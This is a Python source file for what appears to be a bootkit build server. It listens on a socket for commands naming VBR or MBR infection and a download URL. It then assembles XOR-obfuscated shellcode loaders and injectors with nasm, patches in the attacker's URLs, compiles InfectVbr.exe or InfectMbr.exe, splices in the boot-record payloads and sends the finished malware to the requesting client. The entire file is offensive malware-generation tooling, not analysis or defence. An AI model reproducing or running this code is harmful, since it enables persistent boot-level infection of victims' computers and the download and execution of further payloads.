import os
import socket
import commands
import subprocess
import re
import array
import shutil
import tempfile
import struct
import binascii
import time

g_pathVs2008 = "\"C:\\Program Files (x86)\\Microsoft Visual Studio 9.0\\Common7\\IDE\devenv.com\""
g_InfectVbrPath = "C:\BuildServer\\InfectVbr\\"
g_InfectMbrPath = "C:\BuildServer\\InfectMbr\\"
class OnlineInformation:
    def __init__(self):
        self.Type = ""
        self.Operator = ""
        self.UrlDownload = ""
        self.UrlRun = ""
   
def entry():
    
#    (status, output) = commands.getstatusoutput('cmd.exe')
#    print(output.decode('GBK'))
#    runCmdLine("net user")
#    pCommand  = "Vbr,Generate,http://www.bioskit.com/x64UnFp.Bin,http://www.bioskit.com/x64UnCp.Bin,Windowsx64"
#    OnlineInfo = getCommand(pCommand)    
    curDirectory = os.getcwd()
    Sldownloadx86Path = curDirectory + "\\SlDownload\\SlCeLdrDllx86.dll.Bak"
    Sldownloadx64Path = curDirectory + "\\SlDownload\\SlCeLdrDllx64.dll.Bak"

    Socket = socket.socket()
    Host = socket.gethostname()
    #Host = "127.0.0.1"
    port = 8888
    
    Socket.bind((Host,port))
    Socket.listen(5)
    while True:
        Client,Address = Socket.accept()
        curTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))      
        print('Connect Address: ',Address[0] + " " + curTime)
        RecvDat = Client.recv(1024)
        print(RecvDat)
        if (RecvDat.find("Vbr",0,len(RecvDat)) != -1):
            print("Find Vbr")
            vbrOnlineInfo = getCommand(RecvDat)
            print(vbrOnlineInfo.UrlDownload)
            OutPath = curDirectory + "\\" + Address[0]
            if (os.path.exists(OutPath) == False):
                os.mkdir(OutPath)
            if (os.path.exists(OutPath + "\\SlDownload") == False):
                os.mkdir(OutPath + "\\SlDownload")
            if (os.path.exists(OutPath + "\\SlRun") == False):
                os.mkdir(OutPath + "\\SlRun")
            if (os.path.exists(OutPath + "\\SlInjectCode") == False):
                os.mkdir(OutPath + "\\SlInjectCode")
            if (os.path.exists(OutPath + "\\SlVbrLdr") == False):
                os.mkdir(OutPath + "\\SlVbrLdr")
            if (os.path.exists(OutPath + "\\InfectBin") == False):
                os.mkdir(OutPath + "\\InfectBin")                         
            replaceDat(Sldownloadx86Path,os.getcwd() + "\\SlDownload\\SlCeLdrDllx86.dll",vbrOnlineInfo.UrlDownload + "x86UnCp.Bin")
            replaceDat(Sldownloadx64Path,os.getcwd() + "\\SlDownload\\SlCeLdrDllx64.dll",vbrOnlineInfo.UrlDownload + "x64UnCp.Bin")
            if (generateDownload(os.getcwd() + "\\SlDownload") == 2 and \
                os.path.exists(os.getcwd() + "\\SlDownload\\x86UnFp.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlDownload\\x64UnFp.Bin") == True):
                print("generate download moudle success")
                if (os.path.exists(OutPath + "\\SlDownload\\x86UnFp.Bin") == True):
                    os.remove(OutPath + "\\SlDownload\\x86UnFp.Bin")
                shutil.move(os.getcwd() + "\\SlDownload\\x86UnFp.Bin",OutPath + "\\SlDownload")
                print("move file " + os.getcwd() + "\\SlDownload\\x86UnFp.Bin" + "to" + OutPath + "\\SlDownload")
                if (os.path.exists(OutPath + "\\SlDownload\\x64UnFp.Bin") == True):
                    os.remove(OutPath + "\\SlDownload\\x64UnFp.Bin")                
                shutil.move(os.getcwd() + "\\SlDownload\\x64UnFp.Bin",OutPath + "\\SlDownload")
                print("move file " + os.getcwd() + "\\SlDownload\\x64UnFp.Bin" + "to" + OutPath + "\\SlDownload")
            if (generateRunDll(os.getcwd() + "\\SlRun") == 2 and \
                os.path.exists(os.getcwd() + "\\SlRun\\x86UnCp.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlRun\\x64UnCp.Bin") == True):
                print("generate run moudle success")
                if (os.path.exists(OutPath + "\\SlRun\\x86UnCp.Bin") == True):
                    os.remove(OutPath + "\\SlRun\\x86UnCp.Bin") 
                shutil.move(os.getcwd() + "\\SlRun\\x86UnCp.Bin",OutPath + "\\SlRun")
                print("move file " + os.getcwd() + "\\SlRun\\x86UnCp.Bin" + "to" + OutPath + "\\SlRun")
                if (os.path.exists(OutPath + "\\SlRun\\x64UnCp.Bin") == True):
                    os.remove(OutPath + "\\SlRun\\x64UnCp.Bin")                 
                shutil.move(os.getcwd() + "\\SlRun\\x64UnCp.Bin",OutPath + "\\SlRun")
                print("move file " + os.getcwd() + "\\SlRun\\x64UnCp.Bin" + "to" + OutPath + "\\SlRun")
            replaceUrl(os.getcwd() + "\\SlInjectCode\\x86\\x86InjectShellCode.Asm.Bak", \
                       os.getcwd() + "\\SlInjectCode\\x86\\x86InjectShellCode.Asm", \
                       vbrOnlineInfo.UrlDownload)
            replaceUrl(os.getcwd() + "\\SlInjectCode\\x64\\x64InjectShellCode.Asm.Bak", \
                       os.getcwd() + "\\SlInjectCode\\x64\\x64InjectShellCode.Asm", \
                       vbrOnlineInfo.UrlDownload)
            if (generateInject(os.getcwd() + "\\SlInjectCode") == 2 and \
                os.path.exists(os.getcwd() + "\\SlInjectCode\\x86\\x86Inject.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlInjectCode\\x64\\x64Inject.Bin") == True):
                print("generate download moudle success")
                if (os.path.exists(OutPath + "\\SlInjectCode\\x86Inject.Bin") == True):
                    os.remove(OutPath + "\\SlInjectCode\\x86Inject.Bin")
                shutil.move(os.getcwd() + "\\SlInjectCode\\x86\\x86Inject.Bin",OutPath + "\\SlInjectCode")
                if (os.path.exists(OutPath + "\\SlInjectCode\\x64Inject.Bin") == True):
                    os.remove(OutPath + "\\SlInjectCode\\x64Inject.Bin")
                shutil.move(os.getcwd() + "\\SlInjectCode\\x64\\x64Inject.Bin",OutPath + "\\SlInjectCode")
            if (os.path.exists(os.getcwd() + "\\SlVbrLdr\\x86Inject.Bin") == True):
                os.remove(os.getcwd() + "\\SlVbrLdr\\x86Inject.Bin")            
            shutil.copy(OutPath + "\\SlInjectCode\\x86Inject.Bin",os.getcwd() + "\\SlVbrLdr")
            if (os.path.exists(os.getcwd() + "\\SlVbrLdr\\x64Inject.Bin") == True):
                os.remove(os.getcwd() + "\\SlVbrLdr\\x64Inject.Bin")
            shutil.copy(OutPath + "\\SlInjectCode\\x64Inject.Bin",os.getcwd() + "\\SlVbrLdr")
            if (generateVbrLdr(os.getcwd() + "\\SlVbrLdr") == True and \
                os.path.exists(os.getcwd() + "\\SlVbrLdr\\VbrBootShlDrv.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlVbrLdr\\VbrBootLdr.Bin.Compressed") == True):
                print("generate Vbr bootkit moudle success")
                if (os.path.exists(OutPath + "\\SlVbrLdr\\VbrBootShlDrv.Bin") == True):
                    os.remove(OutPath + "\\SlVbrLdr\\VbrBootShlDrv.Bin") 
                shutil.move(os.getcwd() + "\\SlVbrLdr\\VbrBootShlDrv.Bin",OutPath + "\\SlVbrLdr")
                if (os.path.exists(OutPath + "\\SlVbrLdr\\VbrBootLdr.Bin.Compressed") == True):
                    os.remove(OutPath + "\\SlVbrLdr\\VbrBootLdr.Bin.Compressed") 
                shutil.move(os.getcwd() + "\\SlVbrLdr\\VbrBootLdr.Bin.Compressed",OutPath + "\\SlVbrLdr")
            shutil.copy(OutPath + "\\SlVbrLdr\\VbrBootShlDrv.Bin",g_InfectVbrPath + "VbrBootShlDrv.Bin")
            if (generateVbrInfect(g_InfectVbrPath)):
                if (os.path.exists(os.getcwd() + "\\Bin\\InfectVbr.exe")):
                    print("generate InfectVbr.exe success")
                    shutil.copy(os.getcwd() + "\\Bin\\InfectVbr.exe",OutPath + "\\InfectBin\\InfectVbr.exe")
                    
                    pieceInfectFile(OutPath + "\\InfectBin\\InfectVbr.exe",OutPath + "\\SlVbrLdr\\VbrBootShlDrv.Bin",8192,"xVbrCode")
                    
                    sendVbrSize = os.path.getsize(OutPath + "\\InfectBin\\InfectVbr.exe")
                    sendVbrDat = getReadDat(OutPath + "\\InfectBin\\InfectVbr.exe")
                    sendPieceVbrDat = pieceSendStruct("InfectVbr.exe",sendVbrSize,sendVbrDat)
                    #print 'As hex  :', binascii.hexlify(sendPieceVbrDat)           
                    Client.send(sendPieceVbrDat)
                    
                    send86UnFpDat = getReadDat(OutPath + "\\SlDownload\\x86UnFp.Bin")
                    send86UnFpSize = os.path.getsize(OutPath + "\\SlDownload\\x86UnFp.Bin")
                    sendPiece86UnFpDat = pieceSendStruct("x86UnFp.Bin",send86UnFpSize,send86UnFpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece86UnFpDat)                    
                    Client.send(sendPiece86UnFpDat)
                    
                    send64UnFpDat = getReadDat(OutPath + "\\SlDownload\\x64UnFp.Bin")
                    send64UnFpSize = os.path.getsize(OutPath + "\\SlDownload\\x64UnFp.Bin")
                    sendPiece64UnFpDat = pieceSendStruct("x64UnFp.Bin",send64UnFpSize,send64UnFpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece64UnFpDat)                      
                    Client.send(sendPiece64UnFpDat)
                    
                    send86UnCpDat = getReadDat(OutPath + "\\SlRun\\x86UnCp.Bin")
                    send86UnCpSize = os.path.getsize(OutPath + "\\SlRun\\x86UnCp.Bin")
                    sendPiece86UnCpDat = pieceSendStruct("x86UnCp.Bin",send86UnCpSize,send86UnCpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece86UnCpDat)                      
                    Client.send(sendPiece86UnCpDat)
                    
                    send64UnCpDat = getReadDat(OutPath + "\\SlRun\\x64UnCp.Bin")
                    send64UnCpSize = os.path.getsize(OutPath + "\\SlRun\\x64UnCp.Bin")
                    sendPiece64UnCpDat = pieceSendStruct("x64UnCp.Bin",send64UnCpSize,send64UnCpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece64UnCpDat)                    
                    Client.send(sendPiece64UnCpDat) 
                    #Client.send("@xEfi:Success")
        elif (RecvDat.find("Mbr",0,len(RecvDat)) != -1):
            print("Find Mbr")
            mbrOnlineInfo = getCommand(RecvDat)
            print(mbrOnlineInfo.UrlDownload)
            OutPath = curDirectory + "\\" + Address[0]
            if (os.path.exists(OutPath) == False):
                os.mkdir(OutPath)
            if (os.path.exists(OutPath + "\\SlDownload") == False):
                os.mkdir(OutPath + "\\SlDownload")
            if (os.path.exists(OutPath + "\\SlRun") == False):
                os.mkdir(OutPath + "\\SlRun")
            if (os.path.exists(OutPath + "\\SlInjectCode") == False):
                os.mkdir(OutPath + "\\SlInjectCode")
            if (os.path.exists(OutPath + "\\SlMbrLdr") == False):
                os.mkdir(OutPath + "\\SlMbrLdr")
            if (os.path.exists(OutPath + "\\InfectBin") == False):
                os.mkdir(OutPath + "\\InfectBin")                  
            replaceDat(Sldownloadx86Path,os.getcwd() + "\\SlDownload\\SlCeLdrDllx86.dll",mbrOnlineInfo.UrlDownload + "x86UnCp.Bin")
            replaceDat(Sldownloadx64Path,os.getcwd() + "\\SlDownload\\SlCeLdrDllx64.dll",mbrOnlineInfo.UrlDownload + "x64UnCp.Bin")
            if (generateDownload(os.getcwd() + "\\SlDownload") == 2 and \
                os.path.exists(os.getcwd() + "\\SlDownload\\x86UnFp.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlDownload\\x64UnFp.Bin") == True):
                print("generate download moudle success")
                if (os.path.exists(OutPath + "\\SlDownload\\x86UnFp.Bin") == True):
                    os.remove(OutPath + "\\SlDownload\\x86UnFp.Bin")
                shutil.move(os.getcwd() + "\\SlDownload\\x86UnFp.Bin",OutPath + "\\SlDownload")
                print("move file " + os.getcwd() + "\\SlDownload\\x86UnFp.Bin" + "to" + OutPath + "\\SlDownload")
                if (os.path.exists(OutPath + "\\SlDownload\\x64UnFp.Bin") == True):
                    os.remove(OutPath + "\\SlDownload\\x64UnFp.Bin")                
                shutil.move(os.getcwd() + "\\SlDownload\\x64UnFp.Bin",OutPath + "\\SlDownload")
                print("move file " + os.getcwd() + "\\SlDownload\\x64UnFp.Bin" + "to" + OutPath + "\\SlDownload")
            if (generateRunDll(os.getcwd() + "\\SlRun") == 2 and \
                os.path.exists(os.getcwd() + "\\SlRun\\x86UnCp.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlRun\\x64UnCp.Bin") == True):
                print("generate run moudle success")
                if (os.path.exists(OutPath + "\\SlRun\\x86UnCp.Bin") == True):
                    os.remove(OutPath + "\\SlRun\\x86UnCp.Bin") 
                shutil.move(os.getcwd() + "\\SlRun\\x86UnCp.Bin",OutPath + "\\SlRun")
                print("move file " + os.getcwd() + "\\SlRun\\x86UnCp.Bin" + "to" + OutPath + "\\SlRun")
                if (os.path.exists(OutPath + "\\SlRun\\x64UnCp.Bin") == True):
                    os.remove(OutPath + "\\SlRun\\x64UnCp.Bin")                 
                shutil.move(os.getcwd() + "\\SlRun\\x64UnCp.Bin",OutPath + "\\SlRun")
                print("move file " + os.getcwd() + "\\SlRun\\x64UnCp.Bin" + "to" + OutPath + "\\SlRun")
            replaceUrl(os.getcwd() + "\\SlInjectCode\\x86\\x86InjectShellCode.Asm.Bak", \
                       os.getcwd() + "\\SlInjectCode\\x86\\x86InjectShellCode.Asm", \
                       mbrOnlineInfo.UrlDownload)
            replaceUrl(os.getcwd() + "\\SlInjectCode\\x64\\x64InjectShellCode.Asm.Bak", \
                       os.getcwd() + "\\SlInjectCode\\x64\\x64InjectShellCode.Asm", \
                       mbrOnlineInfo.UrlDownload)
            if (generateInject(os.getcwd() + "\\SlInjectCode") == 2 and \
                os.path.exists(os.getcwd() + "\\SlInjectCode\\x86\\x86Inject.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlInjectCode\\x64\\x64Inject.Bin") == True):
                print("generate download moudle success")
                if (os.path.exists(OutPath + "\\SlInjectCode\\x86Inject.Bin") == True):
                    os.remove(OutPath + "\\SlInjectCode\\x86Inject.Bin")
                shutil.move(os.getcwd() + "\\SlInjectCode\\x86\\x86Inject.Bin",OutPath + "\\SlInjectCode")
                if (os.path.exists(OutPath + "\\SlInjectCode\\x64Inject.Bin") == True):
                    os.remove(OutPath + "\\SlInjectCode\\x64Inject.Bin")
                shutil.move(os.getcwd() + "\\SlInjectCode\\x64\\x64Inject.Bin",OutPath + "\\SlInjectCode")
            if (os.path.exists(os.getcwd() + "\\SlMbrLdr\\x86Inject.Bin") == True):
                os.remove(os.getcwd() + "\\SlMbrLdr\\x86Inject.Bin")            
            shutil.copy(OutPath + "\\SlInjectCode\\x86Inject.Bin",os.getcwd() + "\\SlMbrLdr")
            if (os.path.exists(os.getcwd() + "\\SlMbrLdr\\x64Inject.Bin") == True):
                os.remove(os.getcwd() + "\\SlMbrLdr\\x64Inject.Bin")
            shutil.copy(OutPath + "\\SlInjectCode\\x64Inject.Bin",os.getcwd() + "\\SlMbrLdr")
            if (generateMbrLdr(os.getcwd() + "\\SlMbrLdr") == True and \
                os.path.exists(os.getcwd() + "\\SlMbrLdr\\MbrLdr.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlMbrLdr\\MbrCore.Bin") == True and \
                os.path.exists(os.getcwd() + "\\SlMbrLdr\\MbrCore.Bin.Compressed") == True):
                print("generate Mbr bootkit moudle success")
                if (os.path.exists(OutPath + "\\SlMbrLdr\\MbrLdr.Bin") == True):
                    os.remove(OutPath + "\\SlMbrLdr\\MbrLdr.Bin") 
                shutil.move(os.getcwd() + "\\SlMbrLdr\\MbrLdr.Bin",OutPath + "\\SlMbrLdr")
                if (os.path.exists(OutPath + "\\SlMbrLdr\\MbrCore.Bin.Compressed") == True):
                    os.remove(OutPath + "\\SlMbrLdr\\MbrCore.Bin.Compressed") 
                shutil.move(os.getcwd() + "\\SlMbrLdr\\MbrCore.Bin.Compressed",OutPath + "\\SlMbrLdr")
                if (os.path.exists(OutPath + "\\SlMbrLdr\\MbrCore.Bin") == True):
                    os.remove(OutPath + "\\SlMbrLdr\\MbrCore.Bin") 
                shutil.move(os.getcwd() + "\\SlMbrLdr\\MbrCore.Bin",OutPath + "\\SlMbrLdr")   
                
            shutil.copy(OutPath + "\\SlMbrLdr\\MbrLdr.Bin",g_InfectMbrPath + "MbrLdr.Bin")
            shutil.copy(OutPath + "\\SlMbrLdr\\MbrCore.Bin",g_InfectMbrPath + "MbrCore.Bin")
            if (generateMbrInfect(g_InfectMbrPath)):
                if (os.path.exists(os.getcwd() + "\\Bin\\InfectMbr.exe")):
                    print("generate InfectMbr.exe success")
                    shutil.copy(os.getcwd() + "\\Bin\\InfectMbr.exe",OutPath + "\\InfectBin\\InfectMbr.exe")
                    
                    pieceInfectFile(OutPath + "\\InfectBin\\InfectMbr.exe",OutPath + "\\SlMbrLdr\\MbrLdr.Bin",1024,"xMbrLdr")
                    pieceInfectFile(OutPath + "\\InfectBin\\InfectMbr.exe",OutPath + "\\SlMbrLdr\\MbrCore.Bin",12288,"xMbrCore")
                    
                    sendMbrSize = os.path.getsize(OutPath + "\\InfectBin\\InfectMbr.exe")
                    sendMbrDat = getReadDat(OutPath + "\\InfectBin\\InfectMbr.exe")
                    sendPieceMbrDat = pieceSendStruct("InfectMbr.exe",sendMbrSize,sendMbrDat)
                    #print 'As hex  :', binascii.hexlify(sendPieceMbrDat)           
                    Client.send(sendPieceMbrDat)
                    
                    send86UnFpDat = getReadDat(OutPath + "\\SlDownload\\x86UnFp.Bin")
                    send86UnFpSize = os.path.getsize(OutPath + "\\SlDownload\\x86UnFp.Bin")
                    sendPiece86UnFpDat = pieceSendStruct("x86UnFp.Bin",send86UnFpSize,send86UnFpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece86UnFpDat)                    
                    Client.send(sendPiece86UnFpDat)
                    
                    send64UnFpDat = getReadDat(OutPath + "\\SlDownload\\x64UnFp.Bin")
                    send64UnFpSize = os.path.getsize(OutPath + "\\SlDownload\\x64UnFp.Bin")
                    sendPiece64UnFpDat = pieceSendStruct("x64UnFp.Bin",send64UnFpSize,send64UnFpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece64UnFpDat)                      
                    Client.send(sendPiece64UnFpDat)
                    
                    send86UnCpDat = getReadDat(OutPath + "\\SlRun\\x86UnCp.Bin")
                    send86UnCpSize = os.path.getsize(OutPath + "\\SlRun\\x86UnCp.Bin")
                    sendPiece86UnCpDat = pieceSendStruct("x86UnCp.Bin",send86UnCpSize,send86UnCpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece86UnCpDat)                      
                    Client.send(sendPiece86UnCpDat)
                    
                    send64UnCpDat = getReadDat(OutPath + "\\SlRun\\x64UnCp.Bin")
                    send64UnCpSize = os.path.getsize(OutPath + "\\SlRun\\x64UnCp.Bin")
                    sendPiece64UnCpDat = pieceSendStruct("x64UnCp.Bin",send64UnCpSize,send64UnCpDat)
                    #print 'As hex  :', binascii.hexlify(sendPiece64UnCpDat)                    
                    Client.send(sendPiece64UnCpDat)              
        else:
            print("No Find")
        Client.close()
def getCommand(Command):
    onlineInfo = OnlineInformation()
    pCommandList = Command.split(',')
    for i in range(4):
        if (pCommandList[i] == "Vbr" or pCommandList[i] == "Mbr"):
            onlineInfo.Type = pCommandList[i]
        elif (pCommandList[i] == "Generate"):
            onlineInfo.Operator = pCommandList[i]
        elif (pCommandList[i].find("www") != -1):
            if (onlineInfo.UrlDownload == ""):
                onlineInfo.UrlDownload = pCommandList[i]
            else:
                onlineInfo.UrlRun = pCommandList[i]
        #elif (pCommandList[i] != ""):
        #    onlineInfo.System = pCommandList[i]
        print("Command: " + pCommandList[i])
    return onlineInfo
def getReadDat(CodeFile):
    if os.path.exists(CodeFile):
        if os.access(CodeFile,os.R_OK):
            size = os.path.getsize(CodeFile)
            filecode = open(CodeFile,'rb')
            readdat = filecode.read(size)
            filecode.close()
            return readdat
        print("file no read access: " + CodeFile)
        return None
    print("file isn't exist: " + CodeFile)
    return None
def setWriteDat(CodeFile,offset,WriteDat):
    filecode = open(CodeFile,'wb')
    filecode.seek(0)
    filecode.write(WriteDat)
    filecode.close()
    return True   
def runCmdLine(CmdLine):
    if (None != CmdLine):        
        pTask = subprocess.Popen(CmdLine,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        pTask.wait()
        if (pTask.returncode == 0):
            print(CmdLine)
            outInfo = pTask.stdout.readlines()
            for line in outInfo:
                print(line.strip().decode('GBK'))
            return True
    return False
def runCmdLineEx(CmdLine):
    if (None != CmdLine):
        out_temp = tempfile.SpooledTemporaryFile(bufsize = 10 * 1000)
        fileno = out_temp.fileno()        
        pTask = subprocess.Popen(CmdLine,shell=True,stdout=fileno,stderr=fileno)
        pTask.wait()
        out_temp.seek(0)
        lines = out_temp.readlines()
        for line in lines:
            print(line.decode("GBK"))
        if out_temp:
            out_temp.close()        
        return True
    return False
#def getFindOffset(searchDat):
#    searchRegex = re.compile(r'http://www.')
#    mo = searchRegex.search(searchDat)
#    pos = mo.start()
#    return pos
def replaceDat(replaceFile,outPath,newUrl):
    filedat = getReadDat(replaceFile)
    searchdat = bytearray(filedat)
    #fileOffset = getFindOffset(searchdat)
    replace = re.sub(r'http://www.',newUrl,searchdat)
    if (setWriteDat(outPath,0,replace)):
        print(outPath + " write new url success")
        return True
    print(outPath + " write new url failed")
    return False
def replaceUrl(replaceFile,outPath,newUrl):
    filedat = getReadDat(replaceFile)
    searchdat = bytearray(filedat)
    #fileOffset = getFindOffset(searchdat)
    replace = re.sub(r'http://www.Test.com/',newUrl,searchdat)
    if (setWriteDat(outPath,0,replace)):
        print(outPath + " write new url success")
        return True
    print(outPath + " write new url failed")
    return False
def generateRunDll(slRunDllPath):
    generateNum = 0
    curDir = os.getcwd()
    os.chdir(slRunDllPath)
    if (runCmdLine("nasm -f bin x86SlCeLdrDll.Asm -o x86SlCeLdrDll.Bin")):
        print("generate x86SlCeLdrDll.Bin success")
        if(runCmdLine("Compression.exe x86SlCeLdrDll.Bin x86SlCeLdrDll.Bin.Compressed")):
            print("generate x86SlCeLdrDll.Bin.Compressed success")
            os.remove("x86SlCeLdrDll.Bin")
            if (runCmdLine("nasm -f bin x86ContainLdrDll.Asm -o x86ContainLdrDll.Bin")):
                print("generate x86ContainLdrDll.Bin success")
                if (runCmdLine("GenCompressCode.exe xor x86ContainLdrDll.Bin")):
                    print("xor x86ContainLdrDll.Bin success")
                    os.remove("x86SlCeLdrDll.Bin.Compressed")
                    if (runCmdLine("nasm -f bin x86UnCompress.Asm -o x86UnCp.Bin")):
                        os.remove("x86ContainLdrDll.Bin")
                        print("x86UnCp Build Success")
                        generateNum = generateNum + 1
    if (runCmdLine("nasm -f bin x64SlCeLdrDll.Asm -o x64SlCeLdrDll.Bin")):
        print("generate x64SlCeLdrDll.Bin success")
        if(runCmdLine("Compression.exe x64SlCeLdrDll.Bin x64SlCeLdrDll.Bin.Compressed")):
            print("generate x64SlCeLdrDll.Bin.Compressed success")
            os.remove("x64SlCeLdrDll.Bin")
            if (runCmdLine("nasm -f bin x64ContainLdrDll.Asm -o x64ContainLdrDll.Bin")):
                print("generate x64ContainLdrDll.Bin success")
                if (runCmdLine("GenCompressCode.exe xor x64ContainLdrDll.Bin")):
                    print("xor x64ContainLdrDll.Bin success")
                    os.remove("x64SlCeLdrDll.Bin.Compressed")
                    if (runCmdLine("nasm -f bin x64UnCompress.Asm -o x64UnCp.Bin")):
                        os.remove("x64ContainLdrDll.Bin")
                        print("x64UnCp Build Success")
                        generateNum = generateNum + 1
    os.chdir(curDir)
    return generateNum
def generateDownload(slDownloadPath):
    generateNum = 0
    curDir = os.getcwd()
    os.chdir(slDownloadPath)
    if (runCmdLine("nasm -f bin x86SlCeLdrDll.Asm -o x86SlCeLdrDll.Bin")):
        print("generate x86SlCeLdrDll.Bin success")
        if(runCmdLine("Compression.exe x86SlCeLdrDll.Bin x86SlCeLdrDll.Bin.Compressed")):
            print("generate x86SlCeLdrDll.Bin.Compressed success")
            os.remove("x86SlCeLdrDll.Bin")
            if (runCmdLine("nasm -f bin x86ContainLdrDll.Asm -o x86ContainLdrDll.Bin")):
                print("generate x86ContainLdrDll.Bin success")
                if (runCmdLine("GenCompressCode.exe xor x86ContainLdrDll.Bin")):
                    print("xor x86ContainLdrDll.Bin success")
                    os.remove("x86SlCeLdrDll.Bin.Compressed")
                    if (runCmdLine("nasm -f bin x86UnCompress.Asm -o x86UnFp.Bin")):
                        os.remove("x86ContainLdrDll.Bin")
                        print("x86UnFp Build Success")
                        generateNum = generateNum + 1
    if (runCmdLineEx("nasm -f bin x64SlCeLdrDll.Asm -o x64SlCeLdrDll.Bin")):
        print("generate x64SlCeLdrDll.Bin success")
        if(runCmdLine("Compression.exe x64SlCeLdrDll.Bin x64SlCeLdrDll.Bin.Compressed")):
            print("generate x64SlCeLdrDll.Bin.Compressed success")
            os.remove("x64SlCeLdrDll.Bin")
            if (runCmdLine("nasm -f bin x64ContainLdrDll.Asm -o x64ContainLdrDll.Bin")):
                print("generate x64ContainLdrDll.Bin success")
                if (runCmdLine("GenCompressCode.exe xor x64ContainLdrDll.Bin")):
                    print("xor x64ContainLdrDll.Bin success")
                    os.remove("x64SlCeLdrDll.Bin.Compressed")
                    if (runCmdLine("nasm -f bin x64UnCompress.Asm -o x64UnFp.Bin")):
                        os.remove("x64ContainLdrDll.Bin")
                        print("x64UnFp Build Success")
                        generateNum = generateNum + 1
    os.chdir(curDir)
    return generateNum
def generateInject(slInjectPath):
    generateNum = 0
    curDir = os.getcwd()
    os.chdir(slInjectPath + "\\x86")
    if (runCmdLine("nasm -f bin x86InjectShellCode.Asm -o x86InjectShellCode.Bin")):
        print("generate x86InjectShellCode.Bin success")
        if (runCmdLine("GenCompressCode.exe xor x86InjectShellCode.Bin")):
            print("xor x86InjectShellCode.Bin success")
            if (runCmdLine("nasm -f bin x86UnCompress.Asm -o x86Inject.Bin")):
                print("x86Inject.Bin Build Success")
                os.remove("x86InjectShellCode.Bin")
                generateNum = generateNum + 1
    os.chdir(slInjectPath + "\\x64")
    if (runCmdLine("nasm -f bin x64InjectShellCode.Asm -o x64InjectShellCode.Bin")):
        print("generate x64InjectShellCode.Bin success")
        if (runCmdLine("GenCompressCode.exe xor x64InjectShellCode.Bin")):
            print("xor x64InjectShellCode.Bin success")
            if (runCmdLine("nasm -f bin x64UnCompress.Asm -o x64Inject.Bin")):
                print("x64Inject.Bin Build Success")
                os.remove("x64InjectShellCode.Bin")
                generateNum = generateNum + 1
    os.chdir(curDir)     
    return generateNum
def generateVbrLdr(slVbrLdrPath):
    curDir = os.getcwd()
    os.chdir(slVbrLdrPath)
    if (runCmdLine("nasm -f bin VbrBootLdr3.Asm -o VbrBootLdr.Bin")):
        print("generate VbrBootLdr.Bin success")
        if (runCmdLine("aPLib.exe c aPLib VbrBootLdr.Bin VbrBootLdr.Bin.Compressed")):
            print("Compress VbrBootLdr.Bin to VbrBootLdr.Bin.Compressed")
            os.remove("VbrBootLdr.Bin")
            if (runCmdLine("nasm -f bin VbrBootShlDrv.Asm -o VbrBootShlDrv.Bin")):
                print("generate VbrBootShlDrv.Bin success")
                os.chdir(curDir)
                return True
    os.chdir(curDir)
    return False
def generateMbrLdr(slMbrLdrPath):
    curDir = os.getcwd()
    os.chdir(slMbrLdrPath)
    if (runCmdLine("nasm -f bin MbrCore.Asm -o MbrCore.Bin")):
        print("generate MbrCore.Bin success")
        if (runCmdLine("aPLib.exe c aPLib MbrCore.Bin MbrCore.Bin.Compressed")):
            print("Compress MbrCore.Bin to MbrCore.Bin.Compressed")
            #os.remove("MbrCore.Bin")
            if (runCmdLine("nasm -f bin MbrLdr.Asm -o MbrLdr.Bin")):
                print("generate MbrLdr.Bin success")
                os.chdir(curDir)
                return True
    os.chdir(curDir)
    return False
def generateVbrInfect(vbrProjectPath):
    cmdline = g_pathVs2008 + " " + vbrProjectPath + "\\InfectVbr.vcproj /build"
    if (runCmdLineEx(cmdline)):
        return True
    return False
def generateMbrInfect(mbrProjectPath):
    cmdline = g_pathVs2008 + " " + mbrProjectPath + "\\InfectMbr.vcproj /build"
    if (runCmdLineEx(cmdline)):
        return True
    return False    
def pieceSendStruct(fileName,fileSize,fileData):
    sendMbrInfect = array.array("c",fileName)
    packSendMbrData = struct.pack("cccci",'x','E','f','i',fileSize)
    totalMbrData = packSendMbrData + sendMbrInfect.tostring() + '\0' + fileData
    return totalMbrData
def pieceInfectFile(InfectFile,subFile,codeSize,signatureCode):
    if (os.path.exists(InfectFile) == False or \
        os.path.exists(subFile) == False):
        return False
    if (os.access(InfectFile,os.R_OK) == False or \
        os.access(subFile,os.R_OK) == False):
        return False
    infectFileSize = os.path.getsize(InfectFile)
    subFileSize = os.path.getsize(subFile)
    if (infectFileSize < codeSize or subFileSize > codeSize):
        return False
    fpSubFile = open(subFile,'rb')
    subFileDat = fpSubFile.read(subFileSize)
    fpSubFile.close()
    fpInfect = open(InfectFile,'rb')
    infectFileDat = fpInfect.read()
    searchDat = bytearray(infectFileDat)
    infectIndex = searchDat.index(signatureCode)
    newInfectDat = searchDat[0:infectIndex] + subFileDat + searchDat[(infectIndex + subFileSize):]
    fpInfect = open(InfectFile,'wb')
    fpInfect.write(newInfectDat)
    fpInfect.close()
    return True
if __name__ == "__main__":
    entry()






